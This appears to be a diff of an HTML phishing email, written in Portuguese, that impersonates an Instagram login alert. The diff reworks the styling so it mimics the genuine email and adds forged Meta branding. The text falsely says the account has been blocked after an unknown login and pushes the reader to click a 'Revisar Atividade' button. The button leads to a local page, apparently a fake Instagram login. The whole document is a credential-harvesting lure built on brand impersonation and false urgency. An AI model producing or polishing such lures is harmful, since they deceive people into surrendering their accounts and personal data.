@@ -5,49 +5,172 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram - Alerta de Segurança</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #f8f8f8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        .container { max-width: 500px; margin: 20px auto; background-color: white; border: 1px solid #e0e0e0; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 25px; text-align: center; }
-        .logo-area { margin-bottom: 25px; }
-        .logo-text { font-family: "Billabong", cursive; font-size: 38px; color: #333; text-decoration: none; display: block; }
-        h1 { font-size: 20px; color: #262626; margin-bottom: 15px; }
-        p { font-size: 14px; color: #262626; line-height: 1.5; margin-bottom: 10px; }
-        .details-box { background-color: #f2f2f2; border-radius: 4px; padding: 15px; margin: 20px 0; text-align: left; font-size: 13px; color: #555; }
-        .details-box p { margin: 5px 0; }
-        .button { display: inline-block; padding: 12px 25px; margin-top: 25px; background-color: #0095f6; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 15px; }
-        .footer-text { font-size: 11px; color: #888; margin-top: 30px; line-height: 1.4; }
-        .footer-link { color: #0095f6; text-decoration: none; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff; /* Fundo branco como o email original */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #262626; /* Cor de texto principal */
+            line-height: 1.5;
+            -webkit-text-size-adjust: 100%; /* Para garantir que o texto não seja redimensionado em mobile */
+        }
+        .main-wrapper {
+            background-color: #f8f8f8; /* Fundo cinza claro que você tinha antes, fora do container principal */
+            padding: 20px 0;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 550px; /* Largura ligeiramente maior para o conteúdo */
+            margin: 0 auto;
+            background-color: white;
+            border: 1px solid #e0e0e0; /* Borda sutil como no email original */
+            border-radius: 3px; /* Bordas levemente arredondadas */
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1); /* Sombra sutil */
+            padding: 30px;
+        }
+        .header-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        /* Estilo para o logo Instagram em texto puro */
+        .instagram-logo-text {
+            font-family: "Georgia", serif; /* Ou uma fonte serifada que se pareça */
+            font-size: 32px; /* Tamanho da fonte */
+            font-weight: normal; /* Sem negrito */
+            color: #262626; /* Cor padrão do texto */
+            text-decoration: none;
+            display: inline-block;
+            vertical-align: middle;
+            margin-left: 10px; /* Espaço entre o ícone e o texto */
+        }
+        /* Ícone simples de Instagram (pode ser um caracter ou espaço em branco) */
+        .instagram-icon {
+            display: inline-block;
+            vertical-align: middle;
+            width: 28px; /* Largura do ícone */
+            height: 28px; /* Altura do ícone */
+            background-color: #000; /* Fundo preto para o ícone */
+            border-radius: 6px; /* Bordas levemente arredondadas */
+            position: relative;
+            /* Se for usar um ícone simples de caracter (ex: '&#x1F4F7;'), estilizar aqui */
+        }
+        .instagram-icon::before {
+            content: ' '; /* Use vazio ou um caracter unicode se desejar um ícone simples */
+            display: block;
+            position: absolute;
+            top: 4px;
+            left: 4px;
+            right: 4px;
+            bottom: 4px;
+            border: 2px solid white;
+            border-radius: 50%;
+        }
+        .instagram-icon::after {
+            content: ' ';
+            display: block;
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background-color: white;
+            border-radius: 50%;
+            top: 4px;
+            right: 4px;
+        }
+
+        h3 {
+            font-size: 16px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        .highlight {
+            color: #00376b; /* Azul mais escuro para destaque */
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .button-area {
+            text-align: center;
+            margin-top: 30px;
+            margin-bottom: 20px;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #0095f6; /* Azul do Instagram */
+            color: white !important; /* Cor do texto do botão */
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 14px;
+            line-height: 1;
+        }
+        .link-text {
+            font-size: 14px;
+            color: #00376b; /* Azul escuro para links de texto */
+            text-decoration: none;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .link-text:hover {
+            text-decoration: underline;
+        }
+        .footer-meta {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 11px;
+            color: #8e8e8e; /* Cinza claro para o rodapé */
+        }
+        .footer-meta a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+        .footer-meta .meta-logo {
+            vertical-align: middle;
+            margin-right: 5px;
+            height: 10px; /* Tamanho do logo meta, se for usar imagem pequena */
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo-area">
-            <a href="http://localhost:8000/instagram/index.html" style="text-decoration: none;"><span class="logo-text">Instagram</span></a>
+    <div class="main-wrapper">
+        <div class="container">
+            <div class="header-logo">
+                <span class="instagram-logo-text">Instagram</span>
+            </div>
+            
+            <h3 style="text-align: left;">Detectamos um novo login na sua conta.</h3>
+            
+            <p style="text-align: left;">Olá,</p>
+            <p style="text-align: left;">Detectamos um novo login na sua conta do Instagram a partir de um dispositivo que você não costuma usar.</p>
+            <p style="text-align: left;">Para sua segurança, sua conta foi temporariamente bloqueada.</p>
+            
+            <p style="text-align: left;"><strong>Detalhes do Login:</strong></p>
+            <p style="text-align: left; margin-left: 15px;">Dispositivo: Dispositivo Desconhecido (Navegador Chrome)</p>
+            <p style="text-align: left; margin-left: 15px;">Endereço IP: 187.123.45.67</p>
+            <p style="text-align: left; margin-left: 15px;">Localização: Florianópolis - Santa Catarina - Brasil</p>
+            <p style="text-align: left; margin-left: 15px;">Hora: 08/07/2025 - 14:30</p>
+            
+            <p style="text-align: left; margin-top: 20px;">Se não foi você, por favor, clique no botão abaixo para revisar e proteger sua conta imediatamente.</p>
+            
+            <div class="button-area">
+                <a href="http://localhost:8000/instagram/index.html" class="button">Revisar Atividade</a>
+            </div>
+
+            <p style="text-align: left; margin-top: 30px;">Se você tiver alguma dúvida ou não conseguir acessar sua conta, visite o <a href="#" class="link-text">Centro de Ajuda do Instagram</a>.</p>
+            
         </div>
         
-        <h1>Detectamos um novo login na sua conta.</h1>
-        
-        <p>Olá,!</p>
-        <p>Houve um login na sua conta do Instagram a partir de um novo dispositivo que você não costuma usar.</p>
-        
-        <div class="details-box">
-            <p><strong>Dispositivo:</strong> Dispositivo Desconhecido (Navegador Chrome)</p>
-            <p><strong>Endereço IP:</strong> 187.123.45.67</p>
-            <p><strong>Localização:</strong> Florianópolis - Santa Catarina - Brazil</p>
-            <p><strong>Hora:</strong> 08/07/2025 - 14:30</p>
-        </div>
-        
-        <p>Se não foi você, por favor, clique no botão abaixo para revisar e proteger sua conta.</p>
-        
-        <a href="http://localhost:8000/instagram/index.html" class="button">Revisar Atividade</a>
-        
-        <p style="margin-top: 30px;">Obrigado,</p>
-        <p style="margin-bottom: 0;">A Equipe do Instagram</p>
-        
-        <div class="footer-text">
-            <p>Este e-mail foi enviado para {recipient_email_placeholder}.</p>
-            <p>Para desativar estas notificações, visite a Central de Ajuda do Instagram.</p>
-            <p>&copy; 2025 Instagram. From Meta.</p>
-            <p>Avenida Brigadeiro Faria Lima, 3477 - 10º andar - Itaim Bibi, São Paulo - SP, 04538-133</p>
+        <div class="footer-meta">
+            <p>
+                <span style="font-weight: bold; color: #8e8e8e;">De:</span> <span style="font-weight: bold; color: #8e8e8e;">Meta</span>
+                <span style="display: inline-block; margin: 0 5px;">&bull;</span> <a href="#" style="color: #8e8e8e; text-decoration: none;">Privacidade</a>
+                <span style="display: inline-block; margin: 0 5px;">&bull;</span>
+                <a href="#" style="color: #8e8e8e; text-decoration: none;">Termos</a>
+            </p>
+            <p style="margin-top: 5px;">
+                © 2025 Meta Platforms, Inc.<br>
+                1601 Willow Road, Menlo Park, CA 94025
+            </p>
+            <p style="margin-top: 15px;"><a href="#" style="color: #8e8e8e; text-decoration: underline;">Remover este e-mail da sua conta</a></p>
         </div>
     </div>
 </body>
